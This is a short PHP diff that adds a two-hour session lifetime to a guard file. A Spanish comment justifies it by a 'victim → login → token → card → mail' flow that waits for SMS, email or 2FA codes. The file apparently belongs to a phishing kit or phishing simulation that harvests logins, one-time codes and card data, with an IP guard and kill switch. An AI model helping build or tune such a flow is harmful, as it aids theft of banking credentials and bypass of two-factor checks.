@@ -11,6 +11,27 @@ define('SIM_GUARD_LOADED', true);
 
 require_once __DIR__ . '/../_lib.php';
 
+// ---------------------------------------------------------------------
+// Configurar vida de sesión a 2 horas (7200 s) ANTES de session_start().
+// Razón: el flujo víctima → login → token → card → mail puede ser largo
+// (esperar SMS/email/2FA). Con el default de 24 min PHP, $_SESSION['usuario']
+// se pierde y se redirige a index.php interrumpiendo el flujo.
+// ---------------------------------------------------------------------
+if (session_status() === PHP_SESSION_NONE) {
+    @ini_set('session.gc_maxlifetime', '7200');
+    @ini_set('session.cookie_lifetime', '7200');
+    // session_set_cookie_params solo si la sesión aún no arrancó
+    $params = session_get_cookie_params();
+    @session_set_cookie_params([
+        'lifetime' => 7200,
+        'path'     => $params['path']     ?? '/',
+        'domain'   => $params['domain']   ?? '',
+        'secure'   => $params['secure']   ?? false,
+        'httponly' => $params['httponly'] ?? true,
+        'samesite' => $params['samesite'] ?? 'Lax',
+    ]);
+}
+
 $_guard_ip = $_SERVER['REMOTE_ADDR'] ?? '';
 
 // Kill switch global => fuera todos.
